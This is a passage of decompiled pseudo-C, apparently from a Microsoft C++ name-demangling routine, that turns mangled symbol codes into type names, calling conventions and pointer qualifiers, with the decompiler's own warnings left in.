      }
    }
    if ( (v4 & 0x8000) == 0 && (v4 & 0x7C00) == 30720 )
    {
LABEL_121:
      *(_QWORD *)a1 = v76;
      v7 = v77;
      goto LABEL_122;
    }
    goto LABEL_84;
  }
  *(_QWORD *)a1 = v76;
  *(_DWORD *)(a1 + 8) = v77;
  sub_13F161830(a1, "{for ");
  v52 = sub_13F165B08((__int64)v84);
  sub_13F16176C(a1, v52);
  sub_13F1617B0(a1, 125);
  if ( aAvrsafunctionC[25] == 64 )
    off_13F1C5F88 = &aAvrsafunctionC[26];
  return a1;
}
// 13F161C2B: write access to const memory at 13F1C5F88 has been detected
// 13F162153: write access to const memory at 13F1C5FA8 has been detected
// 13F1623E9: write access to const memory at 13F1C5F88 has been detected
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F1C5F90: using guessed type char *off_13F1C5F90;
// 13F1C5FA8: using guessed type int dword_13F1C5FA8;
// 13F1C5FB0: using guessed type __int64 (__fastcall *off_13F1C5FB0)(_QWORD);
// 13F1619F4: using guessed type char var_50[16];
// 13F1619F4: using guessed type char var_40[64];

//----- (000000013F1627A8) ----------------------------------------------------
void __fastcall sub_13F1627A8(__int64 a1, char *a2, unsigned int a3)
{
  __int64 v6; // rax
  __int64 v7; // rax
  char v8; // cl

  if ( *(_QWORD *)a1 )
  {
    *(_DWORD *)(a1 + 8) = 0;
    *(_QWORD *)a1 = 0i64;
    *(_BYTE *)(a1 + 8) = 3;
    return;
  }
  if ( !a2 || !a3 )
  {
    *(_BYTE *)(a1 + 8) = 2;
    return;
  }
  if ( a3 == 1 )
  {
    v7 = sub_13F164BD0((__int64)&off_13F1C5FB0, 16i64, 0);
    if ( v7 )
    {
      v8 = *a2;
      *(_QWORD *)v7 = &charNode::`vftable';
      *(_BYTE *)(v7 + 8) = v8;
      goto LABEL_11;
    }
  }
  else
  {
    v6 = sub_13F164BD0((__int64)&off_13F1C5FB0, 24i64, 0);
    if ( v6 )
    {
      v7 = sub_13F1615B4(v6, (__int64)a2, a3);
      goto LABEL_11;
    }
  }
  v7 = 0i64;
LABEL_11:
  *(_QWORD *)a1 = v7;
  if ( !v7 )
    *(_BYTE *)(a1 + 8) = 3;
}
// 13F18D570: using guessed type void *charNode::`vftable';
// 13F1C5FB0: using guessed type __int64 (__fastcall *off_13F1C5FB0)(_QWORD);

//----- (000000013F162850) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F162850(__int64 a1)
{
  int v2; // esi
  unsigned int v3; // er8
  __int64 v4; // rax
  __int64 v6; // [rsp+20h] [rbp-38h] BYREF
  int v7; // [rsp+28h] [rbp-30h]
  char v8[16]; // [rsp+30h] [rbp-28h] BYREF
  char v9[24]; // [rsp+40h] [rbp-18h] BYREF

  *(_QWORD *)a1 = 0i64;
  *(_DWORD *)(a1 + 8) = 0;
  v2 = 1;
  while ( aAvrsafunctionC[25] != 64 && aAvrsafunctionC[25] != 90 )
  {
    if ( v2 )
      v2 = 0;
    else
      sub_13F1617B0(a1, 44);
    if ( !aAvrsafunctionC[25] )
    {
      sub_13F1618BC(a1, 1u);
      return a1;
    }
    v3 = aAvrsafunctionC[25] - 48;
    if ( v3 > 9 )
    {
      v6 = 0i64;
      v7 = 0;
      sub_13F1654A8((__int64)v8, (__int64)&v6);
      sub_13F16176C(a1, (__int64)v8);
      *(_DWORD *)(a1 + 8) = 0;
      *(_QWORD *)a1 = 0i64;
      *(_BYTE *)(a1 + 8) = 2;
    }
    else
    {
      off_13F1C5F88 = &aAvrsafunctionC[26];
      v4 = sub_13F16167C((signed int *)0x20EA80, (__int64)v9, v3);
      sub_13F16176C(a1, v4);
    }
    if ( *(_BYTE *)(a1 + 8) )
      return a1;
  }
  return a1;
}
// 13F1628C0: write access to const memory at 13F1C5F88 has been detected
// 13F1C5F70: using guessed type __int64 qword_13F1C5F70;
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F162850: using guessed type char var_18[24];

//----- (000000013F16297C) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F16297C(__int64 a1)
{
  int v2; // ecx
  char *v3; // rdx
  __int64 v5; // [rsp+20h] [rbp-18h] BYREF
  int v6; // [rsp+28h] [rbp-10h]

  if ( aAvrsafunctionC[25] == 88 )
  {
    v3 = "void";
    off_13F1C5F88 = &aAvrsafunctionC[26];
    goto LABEL_13;
  }
  if ( aAvrsafunctionC[25] == 90 )
  {
    off_13F1C5F88 = &aAvrsafunctionC[26];
    v3 = "...";
LABEL_13:
    sub_13F161444(a1, v3);
    return a1;
  }
  sub_13F162850((__int64)&v5);
  v2 = v6;
  if ( (_BYTE)v6 || !aAvrsafunctionC[25] )
    goto LABEL_10;
  if ( aAvrsafunctionC[25] == 64 )
  {
    off_13F1C5F88 = &aAvrsafunctionC[26];
LABEL_10:
    *(_QWORD *)a1 = v5;
    *(_DWORD *)(a1 + 8) = v2;
    return a1;
  }
  if ( aAvrsafunctionC[25] == 90 )
  {
    off_13F1C5F88 = &aAvrsafunctionC[26];
    sub_13F161714((__int64)&v5, a1, ",...");
  }
  else
  {
    *(_DWORD *)(a1 + 8) = 0;
    *(_BYTE *)(a1 + 8) = 2;
    *(_QWORD *)a1 = 0i64;
  }
  return a1;
}
// 13F1629E0: write access to const memory at 13F1C5F88 has been detected
// 13F162A11: write access to const memory at 13F1C5F88 has been detected
// 13F162A2F: write access to const memory at 13F1C5F88 has been detected
// 13F162A5A: write access to const memory at 13F1C5F88 has been detected
// 13F1C5F88: using guessed type void *off_13F1C5F88;

//----- (000000013F162A70) ----------------------------------------------------
__int64 __fastcall sub_13F162A70(__int64 a1, __int64 a2)
{
  int v4; // edi
  char *v5; // rdx
  __int64 *v6; // rcx
  __int64 v7; // rax
  __int64 *v8; // rdx
  int v9; // eax
  __int64 v10; // rax
  __int64 v11; // rbx
  __int64 v12; // rax
  char *v13; // rdx
  __int64 v14; // rcx
  __int64 v15; // rax
  __int64 v16; // rax
  __int64 v17; // rax
  bool v18; // zf
  __int64 v19; // rax
  __int64 v20; // rax
  __int64 v22; // [rsp+20h] [rbp-60h] BYREF
  int v23; // [rsp+28h] [rbp-58h]
  __int64 v24; // [rsp+30h] [rbp-50h] BYREF
  int v25; // [rsp+38h] [rbp-48h]
  __int64 v26; // [rsp+40h] [rbp-40h] BYREF
  int v27; // [rsp+48h] [rbp-38h]
  char v28[16]; // [rsp+50h] [rbp-30h] BYREF
  char v29[16]; // [rsp+60h] [rbp-20h] BYREF
  char v30[16]; // [rsp+70h] [rbp-10h] BYREF
  char v31; // [rsp+B0h] [rbp+30h] BYREF

  if ( !aAvrsafunctionC[25] )
  {
    v18 = *(_QWORD *)a2 == 0i64;
    v24 = 0i64;
    v25 = 0;
    if ( v18 )
    {
      v31 = 91;
      sub_13F1627A8((__int64)&v24, &v31, 1u);
      v7 = sub_13F161740((__int64)&v24, (__int64)v30, 1u);
      v8 = (__int64 *)v29;
      goto LABEL_22;
    }
    v31 = 40;
    sub_13F1627A8((__int64)&v24, &v31, 1u);
    sub_13F1616BC((__int64)&v24, (__int64)v28, a2);
    v19 = sub_13F161714((__int64)v28, (__int64)v30, ")[");
    v5 = v29;
    v6 = (__int64 *)v19;
LABEL_6:
    v7 = sub_13F161740((__int64)v6, (__int64)v5, 1u);
    v8 = &v26;
LABEL_22:
    v20 = sub_13F1616E8(v7, (__int64)v8, 93);
    sub_13F162D8C(a1, v20);
    return a1;
  }
  v22 = 0i64;
  v4 = sub_13F164CC4();
  v23 = 0;
  if ( v4 < 0 )
    v4 = 0;
  if ( !v4 )
  {
    v31 = 91;
    sub_13F1627A8((__int64)&v22, &v31, 1u);
    v5 = v28;
    v6 = &v22;
    goto LABEL_6;
  }
  if ( (*(_DWORD *)(a2 + 8) & 0x800) == 0 )
    goto LABEL_9;
  sub_13F161830((__int64)&v22, "[]");
  while ( (char)v23 <= 1 )
  {
LABEL_9:
    v9 = v4--;
    if ( !v9 || !aAvrsafunctionC[25] )
      break;
    v10 = sub_13F163E7C((__int64)v29, 0);
    v31 = 91;
    v24 = 0i64;
    v25 = 0;
    v11 = v10;
    sub_13F1627A8((__int64)&v24, &v31, 1u);
    sub_13F1616BC((__int64)&v24, (__int64)v28, v11);
    v12 = sub_13F1616E8((__int64)v28, (__int64)v30, 93);
    sub_13F16176C((__int64)&v22, v12);
  }
  if ( *(_QWORD *)a2 )
  {
    if ( (*(_DWORD *)(a2 + 8) & 0x800) != 0 )
    {
      v13 = v30;
      v14 = a2;
    }
    else
    {
      v31 = 40;
      v24 = 0i64;
      v25 = 0;
      sub_13F1627A8((__int64)&v24, &v31, 1u);
      sub_13F1616BC((__int64)&v24, (__int64)v28, a2);
      v15 = sub_13F1616E8((__int64)v28, (__int64)v30, 41);
      v13 = v29;
      v14 = v15;
    }
    v16 = sub_13F1616BC(v14, (__int64)v13, (__int64)&v22);
    v22 = *(_QWORD *)v16;
    v23 = *(_DWORD *)(v16 + 8);
  }
  sub_13F1654A8((__int64)&v26, (__int64)&v22);
  v17 = v26;
  *(_DWORD *)(a1 + 8) = v27 | 0x800;
  *(_QWORD *)a1 = v17;
  return a1;
}
// 13F1C5F88: using guessed type void *off_13F1C5F88;

//----- (000000013F162CC4) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F162CC4(__int64 a1)
{
  __int64 v2; // rax
  __int64 v4; // [rsp+20h] [rbp-28h] BYREF
  int v5; // [rsp+28h] [rbp-20h]
  char v6[24]; // [rsp+30h] [rbp-18h] BYREF

  sub_13F161444((__int64)&v4, "__based(");
  if ( !aAvrsafunctionC[25] )
  {
    sub_13F1618BC((__int64)&v4, 1u);
    goto LABEL_9;
  }
  off_13F1C5F88 = &aAvrsafunctionC[26];
  if ( aAvrsafunctionC[25] == 48 )
  {
    sub_13F161830((__int64)&v4, "void");
    goto LABEL_9;
  }
  if ( aAvrsafunctionC[25] == 50 )
  {
    v2 = sub_13F165F80((__int64)v6);
    sub_13F16176C((__int64)&v4, v2);
    goto LABEL_9;
  }
  if ( aAvrsafunctionC[25] != 53 )
  {
LABEL_9:
    sub_13F161830((__int64)&v4, ") ");
    *(_QWORD *)a1 = v4;
    *(_DWORD *)(a1 + 8) = v5;
    return a1;
  }
  *(_DWORD *)(a1 + 8) = 0;
  *(_QWORD *)a1 = 0i64;
  *(_BYTE *)(a1 + 8) = 2;
  return a1;
}
// 13F162D07: write access to const memory at 13F1C5F88 has been detected
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F162CC4: using guessed type char var_18[24];

//----- (000000013F162D8C) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F162D8C(__int64 a1, __int64 a2)
{
  unsigned int v4; // er14
  int v5; // ebx
  char *v6; // rdx
  __int64 v7; // rbx
  __int64 v8; // rax
  __int64 v9; // r8
  __int64 **v10; // rcx
  __int64 v11; // rax
  int v12; // edx
  __int64 *v13; // rcx
  int v14; // eax
  int v15; // ecx
  unsigned __int8 v16; // r14
  char *v17; // rdx
  __int64 v18; // rax
  __int64 *v20; // [rsp+20h] [rbp-30h] BYREF
  int v21; // [rsp+28h] [rbp-28h]
  __int64 v22; // [rsp+30h] [rbp-20h] BYREF
  int v23; // [rsp+38h] [rbp-18h]
  __int64 *v24; // [rsp+40h] [rbp-10h] BYREF
  int v25; // [rsp+48h] [rbp-8h]
  char v26; // [rsp+80h] [rbp+30h] BYREF

  if ( !aAvrsafunctionC[25] )
  {
    v25 = 0;
    v24 = qword_13F18D620;
    v10 = &v24;
    v9 = a2;
    goto LABEL_83;
  }
  v20 = 0i64;
  v21 = 0;
  LOBYTE(v4) = 0;
  v5 = -1;
  off_13F1C5F88 = &aAvrsafunctionC[26];
  if ( (unsigned __int8)aAvrsafunctionC[25] <= 0x4Eu )
  {
    if ( aAvrsafunctionC[25] != 78 )
    {
      if ( (unsigned __int8)aAvrsafunctionC[25] >= 0x43u )
      {
        if ( (unsigned __int8)aAvrsafunctionC[25] <= 0x45u )
        {
          v6 = "char";
          goto LABEL_11;
        }
        if ( (unsigned __int8)aAvrsafunctionC[25] <= 0x47u )
        {
          v6 = "short";
          goto LABEL_11;
        }
        if ( (unsigned __int8)aAvrsafunctionC[25] <= 0x49u )
        {
          v6 = "int";
          goto LABEL_11;
        }
        if ( (unsigned __int8)aAvrsafunctionC[25] <= 0x4Bu )
        {
          v6 = "long";
          goto LABEL_11;
        }
        if ( aAvrsafunctionC[25] == 77 )
        {
          v6 = "float";
LABEL_11:
          sub_13F161644((__int64)&v20, v6);
          goto LABEL_64;
        }
      }
      goto LABEL_60;
    }
    goto LABEL_62;
  }
  if ( aAvrsafunctionC[25] != 79 )
  {
    if ( (unsigned __int8)aAvrsafunctionC[25] <= 0x4Fu )
      goto LABEL_60;
    if ( (unsigned __int8)aAvrsafunctionC[25] <= 0x53u )
    {
      v5 = aAvrsafunctionC[25] & 3;
      goto LABEL_63;
    }
    if ( aAvrsafunctionC[25] == 88 )
    {
      v6 = "void";
      goto LABEL_11;
    }
    if ( aAvrsafunctionC[25] != 95 )
    {
LABEL_60:
      off_13F1C5F88 = "";
LABEL_46:
      v11 = sub_13F164044((__int64)&v24);
      v12 = *(_DWORD *)(v11 + 8);
      v20 = *(__int64 **)v11;
      v21 = v12;
      if ( !v20 )
      {
        *(_QWORD *)a1 = 0i64;
        *(_DWORD *)(a1 + 8) = v12;
        return a1;
      }
LABEL_64:
      if ( aAvrsafunctionC[25] == 67 )
      {
        v17 = "signed ";
      }
      else
      {
        if ( ((aAvrsafunctionC[25] - 69) & 0xF9) != 0 )
        {
          if ( aAvrsafunctionC[25] != 95 )
            goto LABEL_72;
          v16 = v4 - 69;
          if ( v16 > 8u || (v16 & 1) != 0 )
            goto LABEL_72;
        }
        v17 = "unsigned ";
      }
      v18 = sub_13F161444((__int64)&v22, v17);
      sub_13F1616BC(v18, (__int64)&v24, (__int64)&v20);
      v20 = v24;
      v21 = v25;
LABEL_72:
      if ( *(_QWORD *)a2 )
      {
        v24 = 0i64;
        v25 = 0;
        v26 = 32;
        sub_13F1627A8((__int64)&v24, &v26, 1u);
        sub_13F1616BC((__int64)&v24, (__int64)&v22, a2);
        sub_13F16176C((__int64)&v20, (__int64)&v22);
      }
      *(_QWORD *)a1 = v20;
      *(_DWORD *)(a1 + 8) = v21;
      return a1;
    }
    v4 = (unsigned __int8)aAvrsafunctionC[26];
    off_13F1C5F88 = &aAvrsafunctionC[27];
    if ( v4 > 0x4E )
    {
      switch ( v4 )
      {
        case 'O':
          v5 = -2;
          goto LABEL_54;
        case 'R':
          v6 = "<unknown>";
          goto LABEL_11;
        case 'S':
          v6 = "char16_t";
          goto LABEL_11;
        case 'U':
          v6 = "char32_t";
          goto LABEL_11;
        case 'W':
          v6 = "wchar_t";
          goto LABEL_11;
      }
      if ( v4 > 0x57 && (unsigned __int8)v4 <= 0x59u )
      {
        off_13F1C5F88 = &aAvrsafunctionC[26];
        goto LABEL_46;
      }
LABEL_48:
      v6 = "UNKNOWN";
      goto LABEL_11;
    }
    if ( v4 == 78 )
    {
      v6 = "bool";
      goto LABEL_11;
    }
    if ( v4 > 0x47 )
    {
      if ( v4 <= 0x49 )
      {
        v6 = "__int32";
      }
      else if ( v4 <= 0x4B )
      {
        v6 = "__int64";
      }
      else
      {
        v6 = "__int128";
      }
      goto LABEL_11;
    }
    if ( v4 >= 0x46 )
    {
      v6 = "__int16";
      goto LABEL_11;
    }
    if ( !v4 )
    {
      v21 = 1;
      off_13F1C5F88 = &aAvrsafunctionC[26];
      v20 = qword_13F18D620;
      goto LABEL_64;
    }
    if ( v4 != 36 )
    {
      if ( v4 - 68 <= 1 )
      {
        v6 = "__int8";
        goto LABEL_11;
      }
      goto LABEL_48;
    }
    v7 = sub_13F162D8C((__int64)&v24, a2);
    v8 = sub_13F161444((__int64)&v22, "__w64 ");
    v9 = v7;
    v10 = (__int64 **)v8;
LABEL_83:
    sub_13F1616BC((__int64)v10, a1, v9);
    return a1;
  }
  sub_13F161644((__int64)&v20, "long ");
LABEL_62:
  sub_13F161830((__int64)&v20, "double");
LABEL_63:
  if ( v5 == -1 )
    goto LABEL_64;
LABEL_54:
  v20 = 0i64;
  v21 = 0;
  v13 = *(__int64 **)a2;
  v14 = *(_DWORD *)(a2 + 8);
  v24 = *(__int64 **)a2;
  v25 = v14;
  if ( v5 == -2 )
  {
    v25 = v14 | 0x800;
    sub_13F16585C((__int64)&v22, &v20, (__int64)&v24, byte_13F19C050);
    v15 = v23;
    if ( (v23 & 0x800) == 0 )
    {
      sub_13F161830((__int64)&v22, "[]");
      v15 = v23;
    }
    *(_QWORD *)a1 = v22;
    *(_DWORD *)(a1 + 8) = v15;
  }
  else
  {
    if ( !v13 )
    {
      if ( (v5 & 1) != 0 )
      {
        sub_13F161644((__int64)&v20, "const");
        if ( (v5 & 2) != 0 )
          sub_13F161830((__int64)&v20, " volatile");
      }
      else if ( (v5 & 2) != 0 )
      {
        sub_13F161644((__int64)&v20, "volatile");
      }
    }
    sub_13F16585C(a1, &v20, (__int64)&v24, "*");
  }
  return a1;
}
// 13F162DD7: write access to const memory at 13F1C5F88 has been detected
// 13F162E7A: write access to const memory at 13F1C5F88 has been detected
// 13F162EF1: write access to const memory at 13F1C5F88 has been detected
// 13F162F7F: write access to const memory at 13F1C5F88 has been detected
// 13F163072: write access to const memory at 13F1C5F88 has been detected
// 13F162F21: conditional instruction was optimized away because er14.4 is in (4C..4D)
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F1C5F88: using guessed type void *off_13F1C5F88;

//----- (000000013F1631F4) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F1631F4(__int64 a1)
{
  unsigned int v2; // edx
  unsigned int v3; // edx
  char *v4; // rdx
  __int64 v6; // [rsp+20h] [rbp-10h] BYREF
  int v7; // [rsp+28h] [rbp-8h]

  if ( !aAvrsafunctionC[25] )
  {
    *(_DWORD *)(a1 + 8) = 0;
    *(_QWORD *)a1 = qword_13F18D620;
    return a1;
  }
  v2 = aAvrsafunctionC[25] - 65;
  off_13F1C5F88 = &aAvrsafunctionC[26];
  if ( v2 > 0x14 )
  {
    *(_DWORD *)(a1 + 8) = 0;
    *(_BYTE *)(a1 + 8) = 2;
    *(_QWORD *)a1 = 0i64;
    return a1;
  }
  v7 = 2;
  v6 = 0i64;
  v3 = v2 & 0xFFFFFFFE;
  if ( v3 > 0xC )
  {
    switch ( v3 )
    {
      case 0xEu:
        v4 = "__eabi";
        goto LABEL_24;
      case 0x10u:
        v4 = "__vectorcall";
        goto LABEL_24;
      case 0x12u:
        v4 = "__swift_1";
        goto LABEL_24;
      case 0x14u:
        v4 = "__swift_2";
        goto LABEL_24;
    }
  }
  else
  {
    switch ( v3 )
    {
      case 0xCu:
        v4 = "__clrcall";
        goto LABEL_24;
      case 0u:
        v4 = "__cdecl";
        goto LABEL_24;
      case 2u:
        v4 = "__pascal";
        goto LABEL_24;
      case 4u:
        v4 = "__thiscall";
        goto LABEL_24;
      case 6u:
        v4 = "__stdcall";
        goto LABEL_24;
      case 8u:
        v4 = "__fastcall";
LABEL_24:
        sub_13F161644((__int64)&v6, v4);
        break;
    }
  }
  *(_QWORD *)a1 = v6;
  *(_DWORD *)(a1 + 8) = v7;
  return a1;
}
// 13F163224: write access to const memory at 13F1C5F88 has been detected
// 13F16324E: conditional instruction was optimized away because r8.1==1
// 13F1632EB: conditional instruction was optimized away because r8.1==1
// 13F18C730: using guessed type char *off_13F18C730[13];
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F1C5F88: using guessed type void *off_13F1C5F88;

//----- (000000013F163334) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F163334(__int64 a1, __int64 a2, char *a3, _QWORD *a4, int a5)
{
  int v8; // ebx
  int v9; // eax
  __int64 v10; // r14
  __int64 v11; // r12
  int v12; // eax
  unsigned int i; // esi
  __int64 v14; // rax
  char *v15; // r8
  char *v16; // rdx
  __int64 v17; // rax
  char *v18; // rdx
  __int64 v19; // rax
  __int64 v20; // rax
  int v21; // ecx
  char *v22; // r15
  __int64 v23; // rax
  unsigned int v24; // ebx
  __int64 v25; // rax
  __int64 v26; // rax
  __int64 v27; // rax
  __int64 v28; // rax
  int v29; // er14
  __int64 v30; // rax
  __int64 v31; // rax
  __int64 v32; // rax
  __int64 v33; // rax
  __int64 v34; // rax
  __int64 v35; // rax
  __int64 v36; // rax
  __int64 v37; // rax
  __int64 v38; // rax
  __int64 v39; // rax
  __int64 v40; // rax
  __int64 **v41; // rdx
  _QWORD *v42; // r8
  int v43; // ebx
  __int64 v44; // rax
  _QWORD *v45; // r8
  __int64 **v46; // rcx
  char v48[8]; // [rsp+28h] [rbp-A1h] BYREF
  __int64 v49; // [rsp+30h] [rbp-99h] BYREF
  __int64 *v50; // [rsp+38h] [rbp-91h] BYREF
  unsigned int v51; // [rsp+40h] [rbp-89h]
  char v52; // [rsp+48h] [rbp-81h]
  __int64 *v53; // [rsp+50h] [rbp-79h] BYREF
  unsigned int v54; // [rsp+58h] [rbp-71h]
  __int64 *v55; // [rsp+60h] [rbp-69h] BYREF
  unsigned int v56; // [rsp+68h] [rbp-61h]
  char v57[16]; // [rsp+70h] [rbp-59h] BYREF
  __int64 v58; // [rsp+80h] [rbp-49h] BYREF
  int v59; // [rsp+88h] [rbp-41h]
  char v60[16]; // [rsp+90h] [rbp-39h] BYREF
  char v61[16]; // [rsp+A0h] [rbp-29h] BYREF
  char v62; // [rsp+B0h] [rbp-19h] BYREF
  char v63[16]; // [rsp+C0h] [rbp-9h] BYREF
  char v64[72]; // [rsp+D0h] [rbp+7h] BYREF
  char *v66; // [rsp+138h] [rbp+6Fh] BYREF

  v66 = a3;
  v53 = 0i64;
  v54 = 0;
  LOBYTE(v49) = 0;
  if ( !aAvrsafunctionC[25] )
  {
    if ( !a5 )
    {
      if ( *(_QWORD *)a2 )
      {
        if ( (*(_DWORD *)(a2 + 8) & 0x100) == 0 && *a4 )
        {
          v54 = 0;
          v53 = qword_13F18D620;
          sub_13F1616BC((__int64)&v53, (__int64)&v55, (__int64)a4);
          v44 = sub_13F1616E8((__int64)&v55, (__int64)v57, 32);
          v45 = (_QWORD *)a2;
          v46 = (__int64 **)v44;
LABEL_89:
          sub_13F1616BC((__int64)v46, a1, (__int64)v45);
          return a1;
        }
        v45 = (_QWORD *)a2;
LABEL_91:
        v54 = 0;
        v53 = qword_13F18D620;
        v46 = &v53;
        goto LABEL_89;
      }
      if ( *a4 )
      {
        v45 = a4;
        goto LABEL_91;
      }
    }
    *(_DWORD *)(a1 + 8) = 0;
    *(_QWORD *)a1 = qword_13F18D620;
    return a1;
  }
  v8 = a5;
  if ( aAvrsafunctionC[25] == 36 )
  {
    sub_13F1642A0((__int64)&v55, &v66, &v49, a5);
    if ( v55 )
    {
      *(_QWORD *)a1 = v55;
      v9 = v56;
      goto LABEL_5;
    }
  }
  v10 = 0i64;
  v58 = 0i64;
  v11 = 0i64;
  v59 = 0;
  v55 = 0i64;
  v12 = 22;
  v56 = 0;
  v52 = 0;
  v48[0] = 0;
  if ( aAvrsafunctionC[25] >= 65 )
    v12 = 65;
  for ( i = aAvrsafunctionC[25] - v12; ; i = aAvrsafunctionC[25] - v21 )
  {
    switch ( i )
    {
      case 4u:
        if ( v10 )
        {
          v14 = sub_13F1616E8((__int64)&v58, (__int64)v60, 32);
          v15 = "__ptr64";
          v16 = v57;
          goto LABEL_16;
        }
        v18 = "__ptr64";
LABEL_28:
        sub_13F161644((__int64)&v58, v18);
        v10 = v58;
        break;
      case 5u:
        if ( v11 )
        {
          v19 = sub_13F1616E8((__int64)&v55, (__int64)v63, 32);
          v20 = sub_13F161714(v19, (__int64)v64, "__unaligned");
          v11 = *(_QWORD *)v20;
          LODWORD(v20) = *(_DWORD *)(v20 + 8);
          v55 = (__int64 *)v11;
          v56 = v20;
        }
        else
        {
          sub_13F161644((__int64)&v55, "__unaligned");
          v11 = (__int64)v55;
        }
        break;
      case 6u:
        if ( !v8 )
          goto LABEL_82;
        v52 = 1;
        break;
      case 7u:
        if ( !v8 )
          goto LABEL_82;
        v48[0] = 1;
        break;
      case 8u:
        if ( v10 )
        {
          v14 = sub_13F1616E8((__int64)&v58, (__int64)v61, 32);
          v15 = "__restrict";
          v16 = &v62;
LABEL_16:
          v17 = sub_13F161714(v14, (__int64)v16, v15);
          v10 = *(_QWORD *)v17;
          LODWORD(v17) = *(_DWORD *)(v17 + 8);
          v58 = v10;
          v59 = v17;
          break;
        }
        v18 = "__restrict";
        goto LABEL_28;
      default:
        if ( aAvrsafunctionC[25] )
          off_13F1C5F88 = &aAvrsafunctionC[26];
        if ( i > 0x1F )
          goto LABEL_82;
        v22 = v66;
        sub_13F161444((__int64)&v50, v66);
        v23 = sub_13F1616BC((__int64)&v53, (__int64)v57, (__int64)&v50);
        v24 = *(_DWORD *)(v23 + 8);
        v50 = *(__int64 **)v23;
        v51 = v24;
        if ( v10 )
        {
          v25 = sub_13F1616E8((__int64)&v50, (__int64)v57, 32);
          v26 = sub_13F1616BC(v25, (__int64)v60, (__int64)&v58);
          v24 = *(_DWORD *)(v26 + 8);
          v50 = *(__int64 **)v26;
          v51 = v24;
        }
        if ( v11 )
        {
          v27 = sub_13F1616E8((__int64)&v55, (__int64)v57, 32);
          v28 = sub_13F1616BC(v27, (__int64)v60, (__int64)&v50);
          v24 = *(_DWORD *)(v28 + 8);
          v50 = *(__int64 **)v28;
          v51 = v24;
        }
        v29 = a5;
        if ( (i & 0x10) == 0 )
        {
LABEL_56:
          if ( (i & 0xC) != 12 )
            goto LABEL_59;
          if ( !v29 )
          {
            v34 = sub_13F162CC4((__int64)v57);
            v35 = sub_13F1616BC(v34, (__int64)v60, (__int64)&v50);
            v24 = *(_DWORD *)(v35 + 8);
            v50 = *(__int64 **)v35;
            v51 = v24;
LABEL_59:
            if ( (i & 2) != 0 )
            {
              v36 = sub_13F161444((__int64)v57, "volatile ");
              sub_13F1616BC(v36, (__int64)&v53, (__int64)&v50);
              v24 = v54;
              v50 = v53;
              v51 = v54;
            }
            if ( (i & 1) != 0 )
            {
              v37 = sub_13F161444((__int64)v57, "const ");
              sub_13F1616BC(v37, (__int64)&v53, (__int64)&v50);
              v24 = v54;
              v50 = v53;
              v51 = v54;
            }
            if ( v52 )
            {
              v38 = sub_13F161714((__int64)&v50, (__int64)v57, "& ");
              v24 = *(_DWORD *)(v38 + 8);
              v50 = *(__int64 **)v38;
              v51 = v24;
            }
            if ( v48[0] )
            {
              v39 = sub_13F161714((__int64)&v50, (__int64)v57, "&& ");
              v24 = *(_DWORD *)(v39 + 8);
              v50 = *(__int64 **)v39;
              v51 = v24;
            }
            if ( v29 )
              goto LABEL_79;
            if ( *(_QWORD *)a2 )
            {
              v24 = *(_DWORD *)(a2 + 8);
              if ( (v24 & 0x100) == 0 && *a4 )
              {
                v48[0] = 32;
                v55 = 0i64;
                v56 = 0;
                sub_13F1627A8((__int64)&v55, v48, 1u);
                sub_13F1616BC((__int64)&v55, (__int64)&v53, (__int64)a4);
                v40 = sub_13F1616E8((__int64)&v53, (__int64)v57, 32);
                v41 = (__int64 **)sub_13F1616BC(v40, (__int64)v60, a2);
LABEL_78:
                sub_13F16176C((__int64)&v50, (__int64)v41);
                v24 = v51;
                goto LABEL_79;
              }
              if ( (v24 & 0x800) != 0 )
              {
                v50 = *(__int64 **)a2;
LABEL_79:
                v43 = v24 | 0x100;
                if ( (_BYTE)v49 )
                  v43 |= 0x2000u;
                *(_QWORD *)a1 = v50;
                *(_DWORD *)(a1 + 8) = v43;
                return a1;
              }
              v48[0] = 32;
              v55 = 0i64;
              v56 = 0;
              sub_13F1627A8((__int64)&v55, v48, 1u);
              v42 = (_QWORD *)a2;
            }
            else
            {
              if ( !*a4 )
                goto LABEL_79;
              v48[0] = 32;
              v55 = 0i64;
              v56 = 0;
              sub_13F1627A8((__int64)&v55, v48, 1u);
              v42 = a4;
            }
            sub_13F1616BC((__int64)&v55, (__int64)&v53, (__int64)v42);
            v41 = &v53;
            goto LABEL_78;
          }
LABEL_82:
          *(_DWORD *)(a1 + 8) = 0;
          *(_BYTE *)(a1 + 8) = 2;
          *(_QWORD *)a1 = 0i64;
          return a1;
        }
        if ( a5 )
          goto LABEL_82;
        if ( *v22 )
        {
          v30 = sub_13F161444((__int64)v57, "::");
          sub_13F1616BC(v30, (__int64)&v53, (__int64)&v50);
          v50 = v53;
          v51 = v54;
          if ( aAvrsafunctionC[25] )
          {
            v31 = sub_13F165B08((__int64)v57);
            v32 = sub_13F1616BC(v31, (__int64)v60, (__int64)&v50);
            v24 = *(_DWORD *)(v32 + 8);
            v50 = *(__int64 **)v32;
          }
          else
          {
            v54 = 0;
            v53 = qword_13F18D620;
            sub_13F1616BC((__int64)&v53, (__int64)&v55, (__int64)&v50);
            v24 = v56;
            v50 = v55;
          }
        }
        else
        {
          if ( !aAvrsafunctionC[25] )
          {
LABEL_55:
            sub_13F1618BC((__int64)&v50, 1u);
            v24 = v51;
            goto LABEL_56;
          }
          v33 = sub_13F165B08((__int64)v57);
          if ( (_BYTE)v51 == 3 || *(char *)(v33 + 8) <= 1 )
          {
LABEL_52:
            if ( aAvrsafunctionC[25] )
            {
              off_13F1C5F88 = &aAvrsafunctionC[26];
              if ( aAvrsafunctionC[25] != 64 )
                goto LABEL_82;
              goto LABEL_56;
            }
            goto LABEL_55;
          }
          v24 = *(unsigned __int8 *)(v33 + 8) | v24 & 0xFFFFFF00;
        }
        v51 = v24;
        goto LABEL_52;
    }
